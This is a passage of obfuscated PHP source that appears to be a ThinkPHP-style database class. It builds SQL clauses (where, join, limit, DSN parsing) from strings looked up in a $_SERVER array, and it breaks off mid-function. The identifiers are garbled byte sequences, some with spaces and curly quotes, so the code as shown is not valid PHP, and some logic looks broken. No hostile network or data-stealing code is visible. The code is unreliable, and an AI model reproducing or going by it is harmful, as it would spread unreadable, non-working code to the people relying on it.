"\x53\x45\114\x45\103\x54\x25\x44\x49\x53\x54\x49\116\x43\124\45\40\45\106\x49\105\114\x44\45\40\x46\122\117\x4d\40\x25\124\x41\x42\114\x45\x25\x25\x4a\x4f\111\116\45\45\x57\110\x45\122\x45\45\x25\107\122\x4f\125\120\45\45\x48\x41\126\111\x4e\x47\x25\45\x4f\x52\x44\x45\122\x25\45\114\x49\115\x49\x54\x25\40\45\125\116\111\117\x4e\x25\x25\x43\x4f\x4d\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $Fµ…ö Ü†— = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‘®…¢À][856], $Fµ…ö Ü†—); } public function factory($cÉ©õñÁÁó = '') { goto B‡Â´»ê¹¿; B‡Â´»ê¹¿: $AÓáÃ«Æ•Â =& $_SERVER[‘®…¢À]; $cÉ©õñÁÁó = $this->parseConfig($cÉ©õñÁÁó); if (empty($cÉ©õñÁÁó[$AÓáÃ«Æ•Â[857]])) { think_exception(think_lang($AÓáÃ«Æ•Â[858])); } goto eµˆ¹ğÙ¬Ù; eµˆ¹ğÙ¬Ù: $this->dbType = ucwords(strtolower($cÉ©õñÁÁó[$AÓáÃ«Æ•Â[857]])); $BšŸ«‚“³É = $AÓáÃ«Æ•Â[859] . $this->dbType; if (class_exists($BšŸ«‚“³É)) { $c•ßŠˆ…£° = new $BšŸ«‚“³É($cÉ©õñÁÁó); if ($AÓáÃ«Æ•Â[707] != strtolower($cÉ©õñÁÁó[$AÓáÃ«Æ•Â[857]])) { $c•ßŠˆ…£°->dbType = strtoupper($this->dbType); } else { $c•ßŠˆ…£°->dbType = $this->_getDsnType($cÉ©õñÁÁó[$AÓáÃ«Æ•Â[809]]); } } else { think_exception(think_lang($AÓáÃ«Æ•Â[860]) . $AÓáÃ«Æ•Â[861] . $BšŸ«‚“³É); } goto Fàà–èÏÀ; Fàà–èÏÀ: return $c•ßŠˆ…£°; goto C‚Å´Ûø¶; C‚Å´Ûø¶: } public function __call($FßõÏ„øÉ, $C·ãìèÍ„²) { if (method_exists($this, $FßõÏ„øÉ)) { return call_user_func_array(array($this, $FßõÏ„øÉ), $C·ãìèÍ„²); } } protected function _getDsnType($A§À’¾µ¦) { $C«ÃªÉœÜ’ = explode($_SERVER[‘®…¢À][4], $A§À’¾µ¦); $A³Â‘ÊóŠ = strtoupper(trim($C«ÃªÉœÜ’[0])); return $A³Â‘ÊóŠ; } private function parseConfig($eĞ¶•„¼»˜ = '') { $EÏŒ†‘ºä¶ =& $_SERVER[‘®…¢À]; if (!empty($eĞ¶•„¼»˜) && is_string($eĞ¶•„¼»˜)) { $eĞ¶•„¼»˜ = $this->parseDSN($eĞ¶•„¼»˜); } elseif (is_array($eĞ¶•„¼»˜)) { $eĞ¶•„¼»˜ = array_change_key_case($eĞ¶•„¼»˜); $eĞ¶•„¼»˜ = array($EÏŒ†‘ºä¶[857] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[862]], $EÏŒ†‘ºä¶[781] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[863]], $EÏŒ†‘ºä¶[782] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[864]], $EÏŒ†‘ºä¶[779] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[865]], $EÏŒ†‘ºä¶[780] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[866]], $EÏŒ†‘ºä¶[17] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[867]], $EÏŒ†‘ºä¶[809] => $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[868]], $EÏŒ†‘ºä¶[13] => isset($eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[869]]) ? $eĞ¶•„¼»˜[$EÏŒ†‘ºä¶[869]] : array()); } elseif (empty($eĞ¶•„¼»˜)) { if (think_config($EÏŒ†‘ºä¶[709]) && $EÏŒ†‘ºä¶[707] != strtolower(think_config($EÏŒ†‘ºä¶[706]))) { $eĞ¶•„¼»˜ = $this->parseDSN(think_config($EÏŒ†‘ºä¶[709])); } else { $eĞ¶•„¼»˜ = array($EÏŒ†‘ºä¶[857] => think_config($EÏŒ†‘ºä¶[706]), $EÏŒ†‘ºä¶[781] => think_config($EÏŒ†‘ºä¶[870]), $EÏŒ†‘ºä¶[782] => think_config($EÏŒ†‘ºä¶[871]), $EÏŒ†‘ºä¶[779] => think_config($EÏŒ†‘ºä¶[872]), $EÏŒ†‘ºä¶[780] => think_config($EÏŒ†‘ºä¶[873]), $EÏŒ†‘ºä¶[17] => think_config($EÏŒ†‘ºä¶[231]), $EÏŒ†‘ºä¶[809] => think_config($EÏŒ†‘ºä¶[709]), $EÏŒ†‘ºä¶[13] => think_config($EÏŒ†‘ºä¶[874])); } } return $eĞ¶•„¼»˜; } protected function initConnect($AƒÑƒÌ¢Ï© = true) { if (1 == think_config($_SERVER[‘®…¢À][18])) { $this->_linkID = $this->multiConnect($AƒÑƒÌ¢Ï©); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($c‚¼õ¦œÊÑ = false) { $Eôˆ‘•…š =& $_SERVER[‘®…¢À]; static $d‹Éšõßª’ = array(); if (empty($d‹Éšõßª’)) { foreach ($this->config as $e“ÃãĞîåù => $BĞšŠÆªçÄ) { $d‹Éšõßª’[$e“ÃãĞîåù] = explode($Eôˆ‘•…š[47], $BĞšŠÆªçÄ); } } if (think_config($Eôˆ‘•…š[875])) { if ($c‚¼õ¦œÊÑ) { $Dœš¼Ã ¼† = floor(mt_rand(0, think_config($Eôˆ‘•…š[876]) - 1)); } else { if (is_numeric(think_config($Eôˆ‘•…š[877]))) { $Dœš¼Ã ¼† = think_config($Eôˆ‘•…š[877]); } else { $Dœš¼Ã ¼† = floor(mt_rand(think_config($Eôˆ‘•…š[876]), count($d‹Éšõßª’[$Eôˆ‘•…š[779]]) - 1)); } } } else { $Dœš¼Ã ¼† = floor(mt_rand(0, count($d‹Éšõßª’[$Eôˆ‘•…š[779]]) - 1)); } $cö››ˆÚ†¯ = array($Eôˆ‘•…š[781] => isset($d‹Éšõßª’[$Eôˆ‘•…š[781]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[781]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[781]][0], $Eôˆ‘•…š[782] => isset($d‹Éšõßª’[$Eôˆ‘•…š[782]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[782]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[782]][0], $Eôˆ‘•…š[779] => isset($d‹Éšõßª’[$Eôˆ‘•…š[779]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[779]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[779]][0], $Eôˆ‘•…š[780] => isset($d‹Éšõßª’[$Eôˆ‘•…š[780]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[780]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[780]][0], $Eôˆ‘•…š[17] => isset($d‹Éšõßª’[$Eôˆ‘•…š[17]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[17]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[17]][0], $Eôˆ‘•…š[809] => isset($d‹Éšõßª’[$Eôˆ‘•…š[809]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[809]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[809]][0], $Eôˆ‘•…š[13] => isset($d‹Éšõßª’[$Eôˆ‘•…š[13]][$Dœš¼Ã ¼†]) ? $d‹Éšõßª’[$Eôˆ‘•…š[13]][$Dœš¼Ã ¼†] : $d‹Éšõßª’[$Eôˆ‘•…š[13]][0]); return $this->connect($cö››ˆÚ†¯, $Dœš¼Ã ¼†); } public function parseDSN($f ïî§î›•) { $fÈ‰­¸¡™‡ =& $_SERVER[‘®…¢À]; if (empty($f ïî§î›•)) { return !1; } $bÅÑ†Ğ·ˆ = parse_url($f ïî§î›•); if ($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[165]]) { $c×Ì´Ùè¸Ú = array($fÈ‰­¸¡™‡[857] => $bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[165]], $fÈ‰­¸¡™‡[781] => isset($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[526]]) ? $bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[526]] : $fÈ‰­¸¡™‡[33], $fÈ‰­¸¡™‡[782] => isset($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[878]]) ? $bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[878]] : $fÈ‰­¸¡™‡[33], $fÈ‰­¸¡™‡[779] => isset($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[166]]) ? $bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[166]] : $fÈ‰­¸¡™‡[33], $fÈ‰­¸¡™‡[780] => isset($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[167]]) ? $bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[167]] : $fÈ‰­¸¡™‡[33], $fÈ‰­¸¡™‡[17] => isset($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[76]]) ? substr($bÅÑ†Ğ·ˆ[$fÈ‰­¸¡™‡[76]], 1) : $fÈ‰­¸¡™‡[33]); } else { preg_match($fÈ‰­¸¡™‡[879], trim($f ïî§î›•), $dÀ¸ÏŒ³áÛ); $c×Ì´Ùè¸Ú = array($fÈ‰­¸¡™‡[857] => $dÀ¸ÏŒ³áÛ[1], $fÈ‰­¸¡™‡[781] => $dÀ¸ÏŒ³áÛ[2], $fÈ‰­¸¡™‡[782] => $dÀ¸ÏŒ³áÛ[3], $fÈ‰­¸¡™‡[779] => $dÀ¸ÏŒ³áÛ[4], $fÈ‰­¸¡™‡[780] => $dÀ¸ÏŒ³áÛ[5], $fÈ‰­¸¡™‡[17] => $dÀ¸ÏŒ³áÛ[6]); } $c×Ì´Ùè¸Ú[$fÈ‰­¸¡™‡[809]] = $fÈ‰­¸¡™‡[33]; return $c×Ì´Ùè¸Ú; } protected function debug() { $eÇ‰ªŒÕŠ =& $_SERVER[‘®…¢À]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $eÇ‰ªŒÕŠ[880]; if (think_config($eÇ‰ªŒÕŠ[881])) { think_status($eÇ‰ªŒÕŠ[882]); think_trace($this->queryStr . $eÇ‰ªŒÕŠ[883] . think_status($eÇ‰ªŒÕŠ[20], $eÇ‰ªŒÕŠ[882], 6) . $eÇ‰ªŒÕŠ[884], $eÇ‰ªŒÕŠ[33], $eÇ‰ªŒÕŠ[885]); } } protected function parseLock($d«Ì£µè¿¼ = false) { $C©å‚Æ•Ì¶ =& $_SERVER[‘®…¢À]; if (!$d«Ì£µè¿¼) { return $C©å‚Æ•Ì¶[33]; } if ($C©å‚Æ•Ì¶[811] == $this->dbType) { return $C©å‚Æ•Ì¶[886]; } return $C©å‚Æ•Ì¶[887]; } protected function parseSet($fÄ¿‘‚‚¯ñ) { $aä”ƒ¤×ñ¸ =& $_SERVER[‘®…¢À]; foreach ($fÄ¿‘‚‚¯ñ as $FÖÀé‰‹ÀÅ => $A¤„‰†‘è²) { if (is_array($A¤„‰†‘è²) && $aä”ƒ¤×ñ¸[282] == $A¤„‰†‘è²[0]) { $D­ˆê‚Âá³[] = $this->parseKey($FÖÀé‰‹ÀÅ) . $aä”ƒ¤×ñ¸[888] . $A¤„‰†‘è²[1]; } elseif (is_scalar($A¤„‰†‘è²) || is_null($A¤„‰†‘è²)) { $D­ˆê‚Âá³[] = $this->parseKey($FÖÀé‰‹ÀÅ) . $aä”ƒ¤×ñ¸[888] . $this->parseValue($A¤„‰†‘è²); } } return $aä”ƒ¤×ñ¸[889] . implode($aä”ƒ¤×ñ¸[47], $D­ˆê‚Âá³); } protected function bindParam($dŸË“Õ Ó†, $b•Íï³ÃÎ) { $this->bind[$_SERVER[‘®…¢À][4] . $dŸË“Õ Ó†] = $b•Íï³ÃÎ; } protected function parseBind($Dª¡Ø¥§â£) { $Dª¡Ø¥§â£ = array_merge($this->bind, $Dª¡Ø¥§â£); $this->bind = array(); return $Dª¡Ø¥§â£; } function parseKey(&$eËÇ†Æ …, $c‹¢†…¥Ç = true) { if ($c‹¢†…¥Ç) { $eËÇ†Æ … = $this->parseKeyCheck($eËÇ†Æ …); } return $eËÇ†Æ …; } function parseKeyCheck($aõ°í‚´ø) { $dˆƒ‰œéŸÕ =& $_SERVER[‘®…¢À]; $aõ°í‚´ø = trim($aõ°í‚´ø); if (!preg_match($dˆƒ‰œéŸÕ[890], $aõ°í‚´ø)) { think_exception($dˆƒ‰œéŸÕ[891] . $aõ°í‚´ø); } return $aõ°í‚´ø; } protected function parseValue($Aè¿à‡–‡) { $FÃ¿¨îÌÅ =& $_SERVER[‘®…¢À]; if (is_string($Aè¿à‡–‡)) { $Aè¿à‡–‡ = $FÃ¿¨îÌÅ[850] . $this->escapeString($Aè¿à‡–‡) . $FÃ¿¨îÌÅ[850]; } elseif (isset($Aè¿à‡–‡[0]) && is_string($Aè¿à‡–‡[0]) && strtolower($Aè¿à‡–‡[0]) == $FÃ¿¨îÌÅ[282]) { $Aè¿à‡–‡ = $this->escapeString($Aè¿à‡–‡[1]); } elseif (is_array($Aè¿à‡–‡)) { $Aè¿à‡–‡ = array_map(array($this, $FÃ¿¨îÌÅ[851]), $Aè¿à‡–‡); } elseif (is_bool($Aè¿à‡–‡)) { $Aè¿à‡–‡ = $Aè¿à‡–‡ ? $FÃ¿¨îÌÅ[84] : $FÃ¿¨îÌÅ[463]; } elseif (is_null($Aè¿à‡–‡)) { $Aè¿à‡–‡ = $FÃ¿¨îÌÅ[102]; } return $Aè¿à‡–‡; } protected function parseField($cÎÇ¥ËÚéÉ) { $eˆìµî„ÛÍ =& $_SERVER[‘®…¢À]; if (is_string($cÎÇ¥ËÚéÉ) && strpos($cÎÇ¥ËÚéÉ, $eˆìµî„ÛÍ[47])) { $cÎÇ¥ËÚéÉ = explode($eˆìµî„ÛÍ[47], $cÎÇ¥ËÚéÉ); } if (is_array($cÎÇ¥ËÚéÉ)) { $B›¼çÚºƒ = array(); foreach ($cÎÇ¥ËÚéÉ as $eæŠŒùô…‡ => $d™—µ ‡íğ) { if (!is_numeric($eæŠŒùô…‡)) { $B›¼çÚºƒ[] = $this->parseKey($eæŠŒùô…‡) . $eˆìµî„ÛÍ[892] . $this->parseKey($d™—µ ‡íğ); } else { $B›¼çÚºƒ[] = $this->parseKey($d™—µ ‡íğ); } } $bˆ²©©º” = implode($eˆìµî„ÛÍ[47], $B›¼çÚºƒ); } elseif (is_string($cÎÇ¥ËÚéÉ) && !empty($cÎÇ¥ËÚéÉ)) { $bˆ²©©º” = $cÎÇ¥ËÚéÉ; } else { $bˆ²©©º” = $eˆìµî„ÛÍ[173]; } return $bˆ²©©º”; } protected function parseTable($f©°øíµ„Í) { $d¹ÊìÒö  =& $_SERVER[‘®…¢À]; if (is_array($f©°øíµ„Í)) { $D•ßğ°ŸÃÁ = array(); foreach ($f©°øíµ„Í as $Cö¹¼òâ´Ë => $d‚±ßã­‹É) { if (!is_numeric($Cö¹¼òâ´Ë)) { $D•ßğ°ŸÃÁ[] = $this->parseKey($Cö¹¼òâ´Ë) . $d¹ÊìÒö [50] . $this->parseKey($d‚±ßã­‹É); } else { $D•ßğ°ŸÃÁ[] = $this->parseKey($Cö¹¼òâ´Ë); } } $f©°øíµ„Í = $D•ßğ°ŸÃÁ; } elseif (is_string($f©°øíµ„Í)) { if (strstr($f©°øíµ„Í, $d¹ÊìÒö [50])) { return $f©°øíµ„Í; } $f©°øíµ„Í = explode($d¹ÊìÒö [47], $f©°øíµ„Í); array_walk($f©°øíµ„Í, array($this, $d¹ÊìÒö [798])); } return $d¹ÊìÒö [893] . trim(implode($d¹ÊìÒö [894], $f©°øíµ„Í), $d¹ÊìÒö [804]) . $d¹ÊìÒö [893]; } protected function parseWhere($Dò¹Ñ¸‰ë×) { $e™øùÆ¿œ½ =& $_SERVER[‘®…¢À]; $BÂš‘ÃÁ— = $e™øùÆ¿œ½[33]; if (is_string($Dò¹Ñ¸‰ë×)) { $BÂš‘ÃÁ— = $Dò¹Ñ¸‰ë×; } else { $AˆºÂÏèùˆ = isset($Dò¹Ñ¸‰ë×[$e™øùÆ¿œ½[895]]) ? strtoupper($Dò¹Ñ¸‰ë×[$e™øùÆ¿œ½[895]]) : $e™øùÆ¿œ½[33]; if (in_array($AˆºÂÏèùˆ, array($e™øùÆ¿œ½[896], $e™øùÆ¿œ½[897], $e™øùÆ¿œ½[898]))) { $AˆºÂÏèùˆ = $e™øùÆ¿œ½[50] . $AˆºÂÏèùˆ . $e™øùÆ¿œ½[50]; unset($Dò¹Ñ¸‰ë×[$e™øùÆ¿œ½[895]]); } else { $AˆºÂÏèùˆ = $e™øùÆ¿œ½[899]; } foreach ($Dò¹Ñ¸‰ë× as $dö Ş’Ü¼ => $EÂæÛƒ³ÒÈ) { $BÂš‘ÃÁ— .= $e™øùÆ¿œ½[262]; if (is_numeric($dö Ş’Ü¼)) { $dö Ş’Ü¼ = $e™øùÆ¿œ½[900]; } if (0 === strpos($dö Ş’Ü¼, $e™øùÆ¿œ½[71])) { $BÂš‘ÃÁ— .= $this->parseThinkWhere($dö Ş’Ü¼, $EÂæÛƒ³ÒÈ); } else { if (!preg_match($e™øùÆ¿œ½[901], trim($dö Ş’Ü¼))) { think_exception(think_lang($e™øùÆ¿œ½[902]) . $e™øùÆ¿œ½[4] . $dö Ş’Ü¼); } $C¤êø‡å¯ö = is_array($EÂæÛƒ³ÒÈ) && isset($EÂæÛƒ³ÒÈ[$e™øùÆ¿œ½[903]]); $dö Ş’Ü¼ = trim($dö Ş’Ü¼); if (strpos($dö Ş’Ü¼, $e™øùÆ¿œ½[268])) { $c¿İšôÍ ƒ = explode($e™øùÆ¿œ½[268], $dö Ş’Ü¼); $C‡ÄŞ‘ïÉ¾ = array(); foreach ($c¿İšôÍ ƒ as $c‚Æ­†ª²Ÿ => $D½ÏÓ¨«) { $C¾Ìø‚°ç = $C¤êø‡å¯ö ? $EÂæÛƒ³ÒÈ[$c‚Æ­†ª²Ÿ] : $EÂæÛƒ³ÒÈ; $C‡ÄŞ‘ïÉ¾[] = $e™øùÆ¿œ½[245] . $this->parseWhereItem($this->parseKey($D½ÏÓ¨«), $C¾Ìø‚°ç) . $e™øùÆ¿œ½[797]; } $BÂš‘ÃÁ— .= implode($e™øùÆ¿œ½[904], $C‡ÄŞ‘ïÉ¾); } elseif (strpos($dö Ş’Ü¼, $e™øùÆ¿œ½[269])) { $c¿İšôÍ ƒ = explode($e™øùÆ¿œ½[269], $dö Ş’Ü¼); $C‡ÄŞ‘ïÉ¾ = array(); foreach ($c¿İšôÍ ƒ as $c‚Æ­†ª²Ÿ => $D½ÏÓ¨«) { $C¾Ìø‚°ç = $C¤êø‡å¯ö ? $EÂæÛƒ³ÒÈ[$c‚Æ­†ª²Ÿ] : $EÂæÛƒ³ÒÈ; $C‡ÄŞ‘ïÉ¾[] = $e™øùÆ¿œ½[245] . $this->parseWhereItem($this->parseKey($D½ÏÓ¨«), $C¾Ìø‚°ç) . $e™øùÆ¿œ½[797]; } $BÂš‘ÃÁ— .= implode($e™øùÆ¿œ½[899], $C‡ÄŞ‘ïÉ¾); } else { $BÂš‘ÃÁ— .= $this->parseWhereItem($this->parseKey($dö Ş’Ü¼), $EÂæÛƒ³ÒÈ); } } $BÂš‘ÃÁ— .= $e™øùÆ¿œ½[263] . $AˆºÂÏèùˆ; } $BÂš‘ÃÁ— = substr($BÂš‘ÃÁ—, 0, -strlen($AˆºÂÏèùˆ)); } return empty($BÂš‘ÃÁ—) ? $e™øùÆ¿œ½[33] : $e™øùÆ¿œ½[905] . $BÂš‘ÃÁ—; } protected function parseWhereItem($Cèëğ‘½ˆ, $D‘½ì®öÅİ) { $BÄµÇ„‡ =& $_SERVER[‘®…¢À]; $E££Î¼¦Š­ = $BÄµÇ„‡[33]; if (is_array($D‘½ì®öÅİ)) { if (is_string($D‘½ì®öÅİ[0])) { $Aš‚ÚÑí¼ = strtolower($D‘½ì®öÅİ[0]); if (in_array($D‘½ì®öÅİ[0], array($BÄµÇ„‡[888], $BÄµÇ„‡[906], $BÄµÇ„‡[907], $BÄµÇ„‡[908], $BÄµÇ„‡[909], $BÄµÇ„‡[910]))) { $E££Î¼¦Š­ .= $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $D‘½ì®öÅİ[0] . $BÄµÇ„‡[50] . $this->parseValue($D‘½ì®öÅİ[1]); } elseif (preg_match($BÄµÇ„‡[911], $D‘½ì®öÅİ[0])) { $E££Î¼¦Š­ .= $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $this->exp[$Aš‚ÚÑí¼] . $BÄµÇ„‡[50] . $this->parseValue($D‘½ì®öÅİ[1]); } elseif (preg_match($BÄµÇ„‡[912], $D‘½ì®öÅİ[0])) { if (is_array($D‘½ì®öÅİ[1])) { $BĞñ·Â«›Ó = isset($D‘½ì®öÅİ[2]) ? strtoupper($D‘½ì®öÅİ[2]) : $BÄµÇ„‡[897]; if (in_array($BĞñ·Â«›Ó, array($BÄµÇ„‡[896], $BÄµÇ„‡[897], $BÄµÇ„‡[898]))) { $E½—ÒÜ¨Ó = array(); foreach ($D‘½ì®öÅİ[1] as $FåªˆĞÄƒ) { $E½—ÒÜ¨Ó[] = $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $this->exp[$Aš‚ÚÑí¼] . $BÄµÇ„‡[50] . $this->parseValue($FåªˆĞÄƒ); } $E££Î¼¦Š­ .= $BÄµÇ„‡[245] . implode($BÄµÇ„‡[50] . $BĞñ·Â«›Ó . $BÄµÇ„‡[50], $E½—ÒÜ¨Ó) . $BÄµÇ„‡[797]; } } else { $E££Î¼¦Š­ .= $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $this->exp[$Aš‚ÚÑí¼] . $BÄµÇ„‡[50] . $this->parseValue($D‘½ì®öÅİ[1]); } } elseif ($BÄµÇ„‡[282] == $Aš‚ÚÑí¼) { $E££Î¼¦Š­ .= $BÄµÇ„‡[795] . $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $D‘½ì®öÅİ[1] . $BÄµÇ„‡[913]; } elseif (preg_match($BÄµÇ„‡[914], $D‘½ì®öÅİ[0])) { if (isset($D‘½ì®öÅİ[2]) && $BÄµÇ„‡[282] == $D‘½ì®öÅİ[2]) { $E££Î¼¦Š­ .= $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $this->exp[$Aš‚ÚÑí¼] . $BÄµÇ„‡[50] . $D‘½ì®öÅİ[1]; } else { if (is_string($D‘½ì®öÅİ[1])) { $D‘½ì®öÅİ[1] = explode($BÄµÇ„‡[47], $D‘½ì®öÅİ[1]); } $B†“È¸¿½ = implode($BÄµÇ„‡[47], $this->parseValue($D‘½ì®öÅİ[1])); $E££Î¼¦Š­ .= $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $this->exp[$Aš‚ÚÑí¼] . $BÄµÇ„‡[795] . $B†“È¸¿½ . $BÄµÇ„‡[797]; } } elseif (preg_match($BÄµÇ„‡[915], $D‘½ì®öÅİ[0])) { $BœÌã£ª»è = is_string($D‘½ì®öÅİ[1]) ? explode($BÄµÇ„‡[47], $D‘½ì®öÅİ[1]) : $D‘½ì®öÅİ[1]; $E££Î¼¦Š­ .= $BÄµÇ„‡[795] . $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $this->exp[$Aš‚ÚÑí¼] . $BÄµÇ„‡[50] . $this->parseValue($BœÌã£ª»è[0]) . $BÄµÇ„‡[899] . $this->parseValue($BœÌã£ª»è[1]) . $BÄµÇ„‡[263]; } else { think_exception(think_lang($BÄµÇ„‡[902]) . $BÄµÇ„‡[4] . $D‘½ì®öÅİ[0]); } } else { $b…£¸¯¬¤å = count($D‘½ì®öÅİ); $C´Ÿ‡¾£´ = isset($D‘½ì®öÅİ[$b…£¸¯¬¤å - 1]) ? strtoupper($D‘½ì®öÅİ[$b…£¸¯¬¤å - 1]) : $BÄµÇ„‡[33]; if (in_array($C´Ÿ‡¾£´, array($BÄµÇ„‡[896], $BÄµÇ„‡[897], $BÄµÇ„‡[898]))) { $b…£¸¯¬¤å = $b…£¸¯¬¤å - 1; } else { $C´Ÿ‡¾£´ = $BÄµÇ„‡[896]; } for ($cëé‡ŞÇµ = 0; $cëé‡ŞÇµ < $b…£¸¯¬¤å; $cëé‡ŞÇµ++) { $BœÌã£ª»è = is_array($D‘½ì®öÅİ[$cëé‡ŞÇµ]) ? $D‘½ì®öÅİ[$cëé‡ŞÇµ][1] : $D‘½ì®öÅİ[$cëé‡ŞÇµ]; if ($BÄµÇ„‡[282] == strtolower($D‘½ì®öÅİ[$cëé‡ŞÇµ][0])) { $E££Î¼¦Š­ .= $BÄµÇ„‡[245] . $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $BœÌã£ª»è . $BÄµÇ„‡[913] . $C´Ÿ‡¾£´ . $BÄµÇ„‡[50]; } else { $cëãÛ¸ëƒ¹ = is_array($D‘½ì®öÅİ[$cëé‡ŞÇµ]) ? $this->exp[strtolower($D‘½ì®öÅİ[$cëé‡ŞÇµ][0])] : $BÄµÇ„‡[888]; if (!$cëãÛ¸ëƒ¹ && is_array($D‘½ì®öÅİ[$cëé‡ŞÇµ]) && in_array($D‘½ì®öÅİ[$cëé‡ŞÇµ][0], array($BÄµÇ„‡[888], $BÄµÇ„‡[906], $BÄµÇ„‡[907], $BÄµÇ„‡[908], $BÄµÇ„‡[909], $BÄµÇ„‡[910]))) { $cëãÛ¸ëƒ¹ = $D‘½ì®öÅİ[$cëé‡ŞÇµ][0]; } $E££Î¼¦Š­ .= $BÄµÇ„‡[245] . $Cèëğ‘½ˆ . $BÄµÇ„‡[50] . $cëãÛ¸ëƒ¹ . $BÄµÇ„‡[50] . $this->parseValue($BœÌã£ª»è) . $BÄµÇ„‡[913] . $C´Ÿ‡¾£´ . $BÄµÇ„‡[50]; } } $E££Î¼¦Š­ = substr($E££Î¼¦Š­, 0, -4); } } else { $E££Î¼¦Š­ .= $Cèëğ‘½ˆ . $BÄµÇ„‡[916] . $this->parseValue($D‘½ì®öÅİ); } return $E££Î¼¦Š­; } protected function parseThinkWhere($b›–—áÏ’Ê, $F†ÅĞæôÚ) { $dÓâŞºµƒ® =& $_SERVER[‘®…¢À]; $b×¥á÷† = $dÓâŞºµƒ®[33]; switch ($b›–—áÏ’Ê) { case $dÓâŞºµƒ®[335]: $b×¥á÷† = $F†ÅĞæôÚ; break; case $dÓâŞºµƒ®[900]: $b×¥á÷† = is_string($F†ÅĞæôÚ) ? $F†ÅĞæôÚ : substr($this->parseWhere($F†ÅĞæôÚ), 6); break; case $dÓâŞºµƒ®[917]: parse_str($F†ÅĞæôÚ, $B¨º½«Ë³¦); if (isset($B¨º½«Ë³¦[$dÓâŞºµƒ®[895]])) { $aŒöƒ‰ó = $dÓâŞºµƒ®[50] . strtoupper($B¨º½«Ë³¦[$dÓâŞºµƒ®[895]]) . $dÓâŞºµƒ®[50]; unset($B¨º½«Ë³¦[$dÓâŞºµƒ®[895]]); } else { $aŒöƒ‰ó = $dÓâŞºµƒ®[899]; } $Bï¤§ğã¬ = array(); foreach ($B¨º½«Ë³¦ as $AÁÁÖÒÁ—Ç => $AÂ¼Óö×‰‡) { $Bï¤§ğã¬[] = $this->parseKey($AÁÁÖÒÁ—Ç) . $dÓâŞºµƒ®[916] . $this->parseValue($AÂ¼Óö×‰‡); } $b×¥á÷† = implode($aŒöƒ‰ó, $Bï¤§ğã¬); break; } return $b×¥á÷†; } protected function parseLimit($B³ˆš¶Ïšô) { $fğ“ çÕÔŠ =& $_SERVER[‘®…¢À]; return !empty($B³ˆš¶Ïšô) ? $fğ“ çÕÔŠ[48] . $B³ˆš¶Ïšô . $fğ“ çÕÔŠ[50] : $fğ“ çÕÔŠ[33]; } protected function parseJoin($d«ÔèœÅ§) { $bŠê°˜À¼¶ =& $_SERVER[‘®…¢À]; $a¯–â®‘ÂŒ = $bŠê°˜À¼¶[33]; if (!empty($d«ÔèœÅ§)) { if (is_array($d«ÔèœÅ§)) { foreach ($d«ÔèœÅ§ as $F³§˜ê => $c¤¯‹”Ùäğ) { if (!1 !== stripos($c¤¯‹”Ùäğ, $bŠê°˜À¼¶[918])) { $a¯–â®‘ÂŒ .= $bŠê°˜À¼¶[50] . $c¤¯‹”Ùäğ; } else { $a¯–â®‘ÂŒ .= $bŠê°˜À¼¶[919] . $c¤¯‹”Ùäğ; } } } else { $a¯–â®‘ÂŒ .= $bŠê°˜À¼¶[919] . $d«ÔèœÅ§; } } $a¯–â®‘ÂŒ = preg_replace($bŠê°˜À¼¶[920], think_config($bŠê°˜À¼¶[823]) . $bŠê°˜À¼¶[921], $a¯–â®‘ÂŒ); return $a¯–â®‘ÂŒ; } protected function parseOrder($f£»Ê”ó Š) { $Då”Ú´©  =& $_SERVER[‘®…¢À]; if (is_array($f£»Ê”ó Š)) { $d¹í†‚ˆ°¥ = array(); foreach ($f£»Ê”ó Š as $e¼ä’Åµò¶ => $DŠõ¸ÔÎ) { if (is_numeric($e¼ä’Åµò¶)) { $d¹í†‚ˆ°¥[] = $this->parseKey($DŠõ¸ÔÎ); } else { $DŠõ¸ÔÎ = 